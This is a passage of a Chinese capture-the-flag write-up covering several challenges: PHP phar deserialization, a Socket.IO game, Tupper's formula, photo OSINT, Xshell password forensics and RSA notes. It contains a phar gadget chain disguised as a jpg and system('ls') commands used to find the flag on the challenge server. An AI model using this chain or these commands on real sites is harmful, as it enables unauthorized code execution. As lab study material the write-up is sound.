class="hljs-variable">$id</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$checkAccess</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-variable">$checkAccess</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-variable">$id</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Con</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$formatters</span>;<span class="hljs-comment">//数组 array(&#x27;close&#x27;=&gt;array(new Act(), &#x27;run&#x27;))</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;formatters = <span class="hljs-variable">$formatters</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jbn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$reader</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$source</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$str</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;reader = <span class="hljs-variable">$reader</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <br><span class="hljs-variable">$act</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Act</span>(<span class="hljs-string">&#x27;hello.php&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-variable">$formatters</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;close&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-variable">$action</span>, <span class="hljs-string">&#x27;run&#x27;</span>));<br><span class="hljs-variable">$con</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Con</span>(<span class="hljs-variable">$formatters</span>);<br><span class="hljs-variable">$Jbn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jbn</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$con</span>);<br><span class="hljs-variable">$Jbn1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jbn</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$Jbn</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-variable">$Jbn2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jbn</span>(<span class="hljs-variable">$Jbn1</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$jbn2</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&quot;./phar.phar&quot;</span>, <span class="hljs-string">&quot;./phar.jpg&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>
+<p>先includie hello.php试试对了没</p>
+<p>成功！！！！！</p>
+<p>进行后续操作</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140634784.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140924176.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>![](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2023-12\Ori\b141e639e5bdf0bd4d32c9b25098a1e7.png)</p>
+<p>蚁剑连不了</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231150503334.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>它能显示出来说明 highlight就起作用了，那么就已经解析了 手打就行</p>
+<p>那么手打就可以完成接下来的步骤</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231152008650.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><code>(&quot;ls &quot;);?&gt; </code>upload</p>
+<p><code>system(&quot;ls ../&quot;);?&gt; </code>html localhost localhost</p>
+<p><code>system(&quot;ls ../../&quot;);?&gt; </code>cache empty lib local lock log mail opt run spool tmp www www</p>
+<p><code>system(&quot;ls ../../../&quot;);?&gt; </code>bin dev etc home lib media mnt opt proc root run sbin se3ret_th1s_1s_fI5a1_flaggg srv sys tmp usr var var</p>
+<p><code> </code>CBCTF{99ad7edc-6688-4995-94d9-ce63fcf608f3}</p>
+<h6 id="tankTrouble-未做出">tankTrouble 未做出</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230160906147.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230161226648.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>data[“::ffff:36.21.192.102”].score=100000</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230162504375.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>WebSocket</p>
+<p>众所周知，Web 应用的交互过程通常是客户端通过浏览器发出一个请求，服务器端接收请求后进行处理并返回结果给客户端，客户端浏览器将信息呈现，这种机制对于信息变化不是特别频繁的应用尚可，但对于实时要求高、海量并发的应用来说显得捉襟见肘，尤其在当前业界移动互联网蓬勃发展的趋势下，高并发与用户实时响应是 Web 应用经常面临的问题，比如金融证券的实时信息，Web 导航应用中的地理位置获取，社交网络的实时消息推送等。</p>
+<p><strong>传统的请求-响应模式的 Web 开发在处理此类业务场景时，通常采用实时通讯方案，常见的是：</strong></p>
+<ul>
+<li>
+<p><strong>轮询：</strong><br>
+原理简单易懂，就是客户端通过一定的时间间隔以频繁请求的方式向服务器发送请求，来保持客户端和服务器端的数据同步。问题很明显，当客户端以固定频率向服务器端发送请求时，服务器端的数据可能并没有更新，带来很多无谓请求，浪费带宽，效率低下</p>
+</li>
+<li>
+<p>WebSocket 是 HTML5 一种新的协议。它实现了浏览器与服务器全双工通信，能更好的节省服务器资源和带宽并达到实时通讯，它建立在 TCP 之上，同 HTTP 一样通过 TCP 来传输数据，但是它和 HTTP 最大不同是：</p>
+<ul>
+<li>WebSocket 是一种双向通信协议，在建立连接后，WebSocket 服务器和 Browser/Client Agent 都能主动的向对方发送或接收数据，就像 Socket 一样；</li>
+<li>WebSocket 需要类似 TCP 的客户端和服务器端通过握手连接，连接成功后才能相互通信。</li>
+</ul>
+</li>
+</ul>
+<p>HTTP/1.1 200 OK<br>
+Content-Type: text/plain; charset=UTF-8<br>
+Content-Length: 712<br>
+cache-control: no-store<br>
+Date: Sun, 31 Dec 2023 15:34:42 GMT<br>
+Connection: close</p>
+<p>40{“sid”:“_mRxMeqZGNuu8zaoAAJt”}42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]42[“update”,{“::ffff:218.201.252.9”:{“x”:2593,“y”:2593,“r”:0,“health”:5,“score”:0}}]</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101012742813.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>不会就学</p>
+<p>菜了要认，挨打立正</p>
+<p>我们能不能伪装socket客户端向服务端发送加分信息 一直重放</p>
+<p>就可以改变服务端的数据了 好像不行</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101021928005.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>先分析一下连接过程</p>
+<p>这个应该是半双工或者全双工</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124114949.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124059427.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124159682.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>回去逐条打断点分析前端JS逻辑</p>
+<p>发现了这个</p>
+<pre><code class="hljs">onpacket(packet) &#123;        const sameNamespace = packet.nsp === this.nsp;        if (!sameNamespace)            return;        switch (packet.type) &#123;            case PacketType.CONNECT:                if (packet.data &amp;&amp; packet.data.sid) &#123;                    this.onconnect(packet.data.sid, packet.data.pid);                &#125;                else &#123;                    this.emitReserved(&quot;connect_error&quot;, new Error(&quot;It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)&quot;));                &#125;                break;            case PacketType.EVENT:            case PacketType.BINARY_EVENT:                this.onevent(packet);                break;            case PacketType.ACK:            case PacketType.BINARY_ACK:                this.onack(packet);                break;            case PacketType.DISCONNECT:                this.ondisconnect();                break;            case PacketType.CONNECT_ERROR:                this.destroy();                const err = new Error(packet.data.message);                // @ts-ignore                err.data = packet.data.data;                this.emitReserved(&quot;connect_error&quot;, err);                break;        &#125;    &#125;这是啥
+</code></pre>
+<p>2024/1/1 15:26:39</p>
+<p>这段代码是一个 JavaScript 中的方法，它定义了一个 <code>onpacket</code> 方法。根据代码上下文来看，这个方法可能是 <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> 库中某个类的方法。</p>
+<p>在这个方法中，它接收一个参数 <code>packet</code>，表示一个数据包。首先，它检查 <code>packet</code> 中的命名空间 (<code>packet.nsp</code>) 是否与当前对象的命名空间 (<code>this.nsp</code>) 相同。如果命名空间不同，方法直接返回，不执行后续逻辑。</p>
+<p>如果命名空间相同，它会根据 <code>packet</code> 的类型 (<code>packet.type</code>) 进行不同的处理逻辑：</p>
+<ul>
+<li>如果 <code>packet</code> 的类型是 <code>PacketType.CONNECT</code>，它会判断 <code>packet.data.sid</code> 是否存在，如果存在则调用 <code>onconnect</code> 方法，并传递 <code>packet.data.sid</code> 和 <code>packet.data.pid</code> 作为参数。如果 <code>packet.data.sid</code> 不存在，它会触发一个 “connect_error” 事件，并传递一个错误对象作为参数。</li>
+<li>如果 <code>packet</code> 的类型是 <code>PacketType.EVENT</code> 或 <code>PacketType.BINARY_EVENT</code>，它会调用 <code>onevent</code> 方法，并传递 <code>packet</code> 作为参数。</li>
+<li>如果 <code>packet</code> 的类型是 <code>PacketType.ACK</code> 或 <code>PacketType.BINARY_ACK</code>，它会调用 <code>onack</code> 方法，并传递 <code>packet</code> 作为参数。</li>
+<li>如果 <code>packet</code> 的类型是 <code>PacketType.DISCONNECT</code>，它会调用 <code>ondisconnect</code> 方法。</li>
+<li>如果 <code>packet</code> 的类型是 <code>PacketType.CONNECT_ERROR</code>，它会销毁当前对象（调用 <code>destroy</code> 方法），然后创建一个新的错误对象，并将 <code>packet.data.message</code> 赋值给错误对象的 <code>message</code> 属性。最后，它触发一个 “connect_error” 事件，并传递该错误对象作为参数。</li>
+</ul>
+<p>总之，这段代码根据不同类型的数据包执行不同的操作，处理了与 <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> 通信相关的事件和错误。具体的逻辑可能需要结合上下文来更准确地理解其含义。</p>
+<p>在 <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> 中，命名空间（Namespace）是一种用于在客户端和服务器之间划分不同的通信频道或逻辑分组的机制。</p>
+<p><a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> 允许在一个应用程序中创建多个命名空间，每个命名空间可以独立地处理自己的事件和数据传输。通过使用命名空间，可以实现对不同类型的数据进行分组、隔离和处理。</p>
+<p>命名空间在 <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> 中具有以下特点：</p>
+<pre><code class="hljs">命名空间是客户端和服务器之间的双向通信通道。
+每个命名空间都有一个唯一的标识符，默认情况下是 /，表示默认命名空间。
+客户端可以通过连接到指定的命名空间来与服务器进行通信。
+服务器可以监听指定命名空间上的事件，并向该命名空间发送消息。
+不同命名空间之间的连接是隔离的，它们不会共享事件和数据。
+</code></pre>
+<p>通过使用命名空间，可以将相关的功能或模块划分到不同的命名空间中，从而使代码更加模块化和可维护。同时，命名空间也可以用于实现不同权限级别的访问控制和分组管理等需求。</p>
+<p>例如，一个聊天应用可以使用多个命名空间，用于处理不同的聊天房间或不同类型的消息。每个命名空间可以独立地处理与该聊天房间相关的事件和数据传输，从而实现更灵活和可扩展的应用程序架构。</p>
+<p>Socket.js 和 SocketIO.js 是两个不同的 JavaScript 库，它们用于实现实时通信和网络连接方面的功能，但在设计和使用上有一些区别。</p>
+<pre><code class="hljs">Socket.js：Socket.js 是一个基于 WebSocket 协议的库，它提供了对 WebSocket 的封装和简化。WebSocket 是一种用于在客户端和服务器之间进行双向通信的协议，可以实现实时的数据传输和事件交互。Socket.js 专注于 WebSocket 连接和消息传输，提供了一些简单的 API 来创建和管理 WebSocket 连接，发送和接收消息。
+
+SocketIO.js：SocketIO.js 是一个更高级别的库，它建立在 WebSocket 之上，并提供了更多的功能和抽象层。除了支持 WebSocket，它还可以在不同的环境中使用其他传输方式，如轮询（polling）和长轮询（long polling），以便兼容不支持 WebSocket 的浏览器或设备。SocketIO.js 提供了实时通信的核心功能，例如实时事件、房间（room）管理、广播等，使开发者可以更方便地构建实时应用程序。
+</code></pre>
+<p>总结来说，Socket.js 更加专注于底层的 WebSocket 连接和消息传输，而 SocketIO.js 则提供了更高级别的功能和抽象层，包括对不同传输方式的支持、事件管理、房间管理等。选择使用哪个库取决于具体的需求和项目的复杂性。如果只需要基本的 WebSocket 连接和消息传输，可以选择 Socket.js；如果需要更多的高级功能和跨浏览器兼容性，可以选择 SocketIO.js。</p>
+<h5 id="MISC">MISC</h5>
+<h6 id="real-Sign-in">real_Sign_in</h6>
+<p>​							 							 								Signin</p>
+<p>听说空格梦到过flag，去问他吧 1704344979</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230100119014.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h6 id="Tupper">Tupper</h6>
+<p>zip中有544个zip</p>
+<p>用bandzip智能解压到单个文件夹 后得到544个txt</p>
+<p>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br>script_dir = os.path.dirname(os.path.abspath(__file__))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">544</span>):<br><br>  file_name = os.path.join(script_dir, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>.txt&#x27;</span>)<br><br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> input_file:<br><br>  file_content = input_file.read()<br><br>  <br><br>  output_file_path = os.path.join(script_dir, <span class="hljs-string">&#x27;test.txt&#x27;</span>)<br><br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> output_file:<br><br>  output_file.write(file_content)<br></code></pre></td></tr></table></figure>
+<p>得到2430300279971732586306732048042092863199653171927794467693459300972786378547280955562809687500152634692779823565763915547054401016328754101432014140582831594296812996790110355750752839700057610333643268996981237954031719229265468574678123751449120722542208774709531347763029887116238941109081309969800374434289479188925825535231559303854752686132605919041400266012842603637640293233945817633405014578138622221890849592254661917366671611371389339503282961869143217807914631796828719245587290094562044412857349315361240136183939478574056568128542</p>
+<p>用gunplot绘图</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105344499.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>没有发现</p>
+<p>联系题意</p>
+<p>Tupper 是一种数学表达式和算法，用于生成图像中的有趣图案。它以其发现者 Jeff Tupper 的名字命名。</p>
+<p>Tupper’s self-referential formula（Tupper自指公式）是一个二维函数，可以将一系列整数坐标映射到一个二值图像中。这个公式被设计成在特定的参数条件下产生一个带有自指特性的图案。具体来说，将 Tupper 自指公式应用于适当选择的参数后，可以生成一个在图像中显示出该公式本身的图案。</p>
+<p>Tupper 图案通常以黑白像素表示，其中黑色像素表示1，白色像素表示0。通过适当的参数设置，可以在图像中准确地绘制出 Tupper 自指公式。</p>
+<p>Tupper 图案之所以有趣，是因为它展示了数学、计算和图像之间的关联。它是一个有趣的数学探索，并且可以用于生成独特的视觉效果。</p>
+<p>希望这个简要介绍能够回答您关于 Tupper 的问题。如果您还有其他问题，请随时提问。</p>
+<p>看看 查一下</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105809617.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105856162.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h6 id="大地之母">大地之母</h6>
+<p>![](file:///C:/Users/asus/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/TempState/ShareServiceTempFolder/BaD.jpeg)</p>
+<p>名称BaD</p>
+<p>疑似露出了一个字 好像是什么峰</p>
+<p>这道题像是一道社工题</p>
+<p>左下角有指南针</p>
+<p>像是地图软件</p>
+<p>请找到这张图片的作者，flag为 CBCTF{md5(作者账号名)}</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231154143347.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="http://img.mp.itc.cn/q_mini,c_zoom,w_640/upload/20170615/716f1c264aef4ea0a1f6b8b4dcfa9be0_th.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>经过确定</p>
+<p>是珠穆朗玛峰</p>
+<p>注意到原图太阳被遮挡</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231155036279.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>珠穆朗玛峰，世界上最高的山峰</p>
+<p>我们的团队曾在2012年拍摄过珠穆朗玛峰的照片，以创建360张照片的虚拟之旅。</p>
+<p>你可以在这里看到我们在2012年1月拍摄的照片。这是我们2012年12月的虚拟之旅。</p>
+<p>幸运的是，进步并没有停滞不前，这使我们能够多样化我们的照片和视频性能，并改善我们的工作结果。这就是我们经常升级设备的原因。</p>
+<p>照片和视频由Sergey Semenov和Ivan Roslyakov提供</p>
+<p>2022年12月23日</p>
+<p>接下来找一下这两个人</p>
+<p>其中第一个有专门域名的自己网站</p>
+<p>大概率是他</p>
+<p>Russian photographer <a target="_blank" rel="noopener" href="http://www.sergesemenov.com/">Sergey Semenov</a></p>
+<p>Sergey  Semenov是一位俄罗斯的摄影师，他主要擅长人像摄影和时尚摄影。他的作品风格多样，既有明亮清新的色彩，也有复古经典的黑白风格。他的作品曾被多家国际杂志和媒体报道和发表，包括Vogue、Elle、Harper’s Bazaar等。他还曾与多个知名品牌合作，如L’Oreal Paris、Yves Saint  Laurent、H&amp;M等。他的作品在摄影领域内备受赞誉，被誉为俄罗斯最具代表性的摄影师之一。</p>
+<p>提交了一下 失败 再找吧</p>
+<p>名字全大写无空格</p>
+<p>埃佛勒斯峰是以一位威尔士测量员的名字命名的，他在19世纪中期绘制了印度大部分地区的地图。在当地，这座山的尼泊尔名字是Sagarmatha，意思是“天空女神”，在藏语中是Chomolungma，意思是“山神之母</p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%A4%A7%E5%9C%B0%E4%B9%8B%E6%AF%8D/770840"><em>大地之母</em>*（中国传统神话人物）_百度百科</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/**%E5%A4%A7%E5%9C%B0%E4%B9%8B%E6%AF%8D">https://baike.baidu.com/item/**大地之母</a>**</p>
+<p><strong><em>*</em>***地母神、大地之母或母神是指专司繁殖力及象征大地恩惠的女神*****</strong>*</p>
+<p>珠穆朗玛<strong>峰</strong> （台湾称 圣母<strong>峰</strong> ），简称 珠峰</p>
+<p>Everest</p>
+<p>在twitter，Facebook没找到</p>
+<p>回去看图</p>
+<p>看到右下角有指南针，有点怀疑是地图软件类型，准备去找找</p>
+<p>对比了几个软件</p>
+<p>发现是谷歌地图的界面</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231211149638.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>ELSEMIGUEL</p>
+<p>32位md5加密后包裹flag{}即可</p>
+<h6 id="JBN-差最后一步">JBN 差最后一步</h6>
+<p>先开始用AXIOM examine和process看的</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101141831314.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>“User Assist” 是一个 Windows 操作系统中的功能，用于记录用户在计算机上使用应用程序的频率和时间。它主要用于跟踪用户的应用程序使用习惯和行为模式。</p>
+<p>User Assist 功能会记录用户打开的应用程序、文件夹以及执行的操作，并将这些信息存储在 Windows 注册表中。这些信息被用于生成开始菜单、任务栏等位置上的最近使用应用程序列表，以方便用户快速访问常用的应用程序。</p>
+<p>User Assist 的数据存储在注册表的 “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist” 键下。它包含一些子键，每个子键对应一个应用程序或操作。这些子键中存储了应用程序或操作的执行次数、最后执行的时间等信息。</p>
+<p>需要注意的是，User Assist 数据主要用于改善用户体验和提供快速访问常用应用程序的功能，不会包含敏感信息。此外，User Assist 可以被禁用或清除以保护用户隐私。</p>
+<p>新建虚拟机<img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180835810.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180927920.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>hint</p>
+<p>弱口令</p>
+<p>对着一个一个试</p>
+<p>password</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182024195.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101181249352.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>登入成功</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182121236.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>打开后看到xshell</p>
+<p>用户名root</p>
+<p>密码</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101184010183.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>那这个桌面明晃晃的一个xshell</p>
+<p>肯定得看这个</p>
+<p>审阅文件夹</p>
+<p>我一开始不太了解xshell 想着是看看有什么</p>
+<p>查查看 这方面</p>
+<p>它可能存在哪些取证方向</p>
+<p>2024/1/1 18:34:16</p>
+<p>Xshell作为一款终端模拟软件，可能存在以下取证方向：</p>
+<ol>
+<li>登录日志：Xshell会记录用户登录的时间、IP地址、用户名等信息，可以通过分析登录日志来确定用户的活动轨迹。</li>
+<li>命令历史：Xshell会保存用户在远程服务器上执行的命令历史记录，可以通过分析命令历史来还原用户的操作过程。</li>
+<li>文件传输：Xshell支持文件传输功能，可以将本地文件上传到远程服务器或从远程服务器下载文件。可以通过分析传输日志和相关文件来确定文件的来源和去向。</li>
+<li>加密协议：Xshell使用SSH协议进行通信，并支持RSA/DSA公钥验证，可以通过解密和分析加密数据包来还原通信内容。</li>
+<li>安全设置：Xshell提供了一些网络安全功能，如端口转发、X11转发等，可以通过分析安全设置来判断用户是否有意图绕过安全限制或进行非法操作。</li>
+</ol>
+<p>需要注意的是，进行取证活动时应遵守相关法律法规，并获取合法的授权。</p>
+<p>然后查日志什么都没有查到</p>
+<p>后来了解到sessions中有很多参数，连接服务器的密码，SID，等等都在其中，就打开进行查看</p>
+<p>找到password</p>
+<p>hEmTIaYScRHT3tDqLgQnh6hlr6mbKatbTmg2a1+InOc7jyOTVUwbbZEKBIxVIXk98I1Nor4RAVzQjEuxZVI=</p>
+<p>先开始认为符合base64特征</p>
+<p>进行解密</p>
+<p>失败</p>
+<p>后来向出题人说明了我的进展</p>
+<p>得知hint&quot;工具&quot;</p>
+<p>Xshell 工具</p>
+<p>关联词是Xshell解密工具</p>
+<p>吾爱论坛:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=redirect&amp;goto=findpost&amp;pid=27789653&amp;ptid=1022040">akinet 发表于 2019-9-10 17:01</a><br>
+什么原理？循环找密码么</p>
+</blockquote>
+<p>不是，是根据加密算法逆向解密，类似的工具还有<br>
+都是我工作中偶尔用到的</p>
+<p>随后我下载了以下三个网上流传的工具进行解密</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101202459405.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但发现均不完整</p>
+<p>遇到一些配置问题 导致解密功亏一篑</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101203131057.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>比赛时间截止 比赛结束 解题失败</p>
+<h5 id="Crypto">Crypto</h5>
+<h6 id="二次剩余-想到完整思路-没时间了">二次剩余  想到完整思路 没时间了</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231213502848.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这个题我其实有思路</p>
+<p>我在初学CTF的时候研究过一段时间密码学，尤其是RSA</p>
+<p>这个题就是RSA的其中一部分，把它当成RSA做就行</p>
+<p>RSA概要</p>
+<ol>
+<li>选取两个较大的互不相等的质数p和q，计算<code>n = p * q</code> 。</li>
+<li>计算<code>phi = (p-1) * (q-1)</code> 。</li>
+<li>选取任意e，使得e满足 <code>1&lt;e&lt;phi</code> 且 <code>gcd(e , phi) == 1</code> 。</li>
+<li>计算e关于phi的模逆元d， 即d满足<code>(e * d)% phi ==1</code> 。</li>
